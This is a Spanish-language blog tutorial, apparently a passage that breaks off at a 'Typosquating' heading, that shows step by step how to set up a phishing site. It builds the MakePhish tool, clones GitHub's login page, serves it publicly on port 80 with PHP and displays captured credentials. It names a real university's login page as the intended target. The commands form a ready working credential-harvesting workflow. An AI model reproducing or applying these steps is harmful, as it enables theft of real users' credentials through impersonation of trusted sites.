
Vamos a demostrar lo fácil que es montar un sitio web de **phishing** para robar las credenciales del primer cibernauta incauto que pique la caña. 
La palabra *phishing* es un anglicismo que puede emplearse en lugar de "suplantación de identidad" [[?]​](https://www.facebook.com/RAE/posts/extranjerismos-phishingpara-evitar-el-anglicismo-phishing-se-pueden-emplear-en-s/4168733576480269/) y denota el intento de un atacante de extrase información sensible o simplemente perjudicar una victima enviandole un mensaje fraudulento o presentandose como alguien o algo que no es, como por ejemplo alguien de confianza, su jefe o su banco. En nuestro ejemplo no haremos pasar por el inicio de sesion de la universidad lo cual nos daría la posibildiad de capturar credenciales de cuentas institucionales

## Primero lo primero: el sevidor web
Al montar un página web falsa, pues, necesitamos donde alojar nuestra página que sea accesible desde cualquier parte del internet. El proceso del montaje del servidor web graiuto lo explicamos ya en el artículo [crear un servidor web con Google Cloud](https://fredyrosero.github.io/google%20cloud/2022/02/27/Crear-una-servidor-web-gr%C3%A1tis-con-Google-Cloud.html) donde configuramos el servidor *Apache* para que busque los archivos a servir en `/home/user/www`. Sin embargo, en vez de utilizar *Apache* vamos a utilizar el servidor web integrado de **PHP** [[?]](https://www.php.net/manual/en/features.commandline.webserver.php)

## Make Phish de @andpalmier
El programa `MakePhish` de [@andpalmier](https://github.com/andpalmier) nos permite clonar sitios web automáticamente y parchearlos con PHP para crear páginas de phishing
> This is a proof of concept to automatically create phishing kits based on a specified URL, please note that makephish will work exclusively on websites having a simple pages with `<form>` logins.

https://github.com/andpalmier/makephish

Procederemos a clonar la página de inicio de sesión de la Universidad Nacional para luego servirla en nuestro servidor web:

### Prerrequisitos
1. Instalmos `cURL`, `Git` y las los escenciales de compilación de linux:
    ```bash
    sudo apt update
    sudo apt install curl git build-essential
    ```

2. Instalamos `Go` y hacemos el comando accesible
    ```bash
    mkdir sandbox
    cd sandbox
    curl -O https://dl.google.com/go/go1.12.7.linux-amd64.tar.gz
    tar xvf go1.12.7.linux-amd64.tar.gz
    sudo chown -R root:root ./go
    sudo mv go /usr/local
    vim ~/.profile
    # export GOPATH=$HOME/work
    # export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin
    ```

### Instalación de MakePhish
Clonamos el repositorio de `MakePhish` y compilamos el programa

```bash
mkdir ~/scripts
cd ~/scripts
git clone https://github.com/andpalmier/makephish
cd makephish
make makephish
```

### Ejecución
1. Clonaremos la página de inicio de sesión de *Github* que por defecto quedará en `kits/`
    ```bash
    URL="https://github.com/login/"
    cd ~/scripts/makephish
    ./build/makephish -url $URL
    ```
2. En el directorio creado en `kits/` lanzaremos el servidor de *PHP* con acceso remoto en el puerto 80 
    ```bash
    cd kits/github.com
    sudo php -S 0.0.0.0:80
    ```
3. La victima ingresaría sus credenciales y nuestra página impostora redirigirá el usuario a la página real de Github. Para este ejemplo usaremos `miUsuario` como usuario y `miContraseñ4` como contraseña.

4. Para ver las credenciales capturadas, vamos a la URL web `/log` de nuestro servidor, en esta caso con `curl localhost/log`:
    ```
    =============+=============
    Username/Email: miUsuario
    Password:       miContraseñ4
    IP:
    Date:           Mon Feb 28, 2022 7:25 am
    User Agent:     Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
    ===========================
    ``` 
#### Observaciones
El código intentará obtener el nodo HTML tipo formulario con el atributo `method` [[?]](https://github.com/andpalmier/makephish/blob/main/cmd/makephish/makephish.go#L44) y luego parchará el arhivo `index.html` de la carpeta de desitno
No todos los formularios son compatibles
```bash
URL="https://smartkey.xertica.com/cloudkey/a/unal.edu.co/user/login"
cd ~/scripts/makephish
./build/makephish -url $URL
```

No compatible fish
## Typosquating
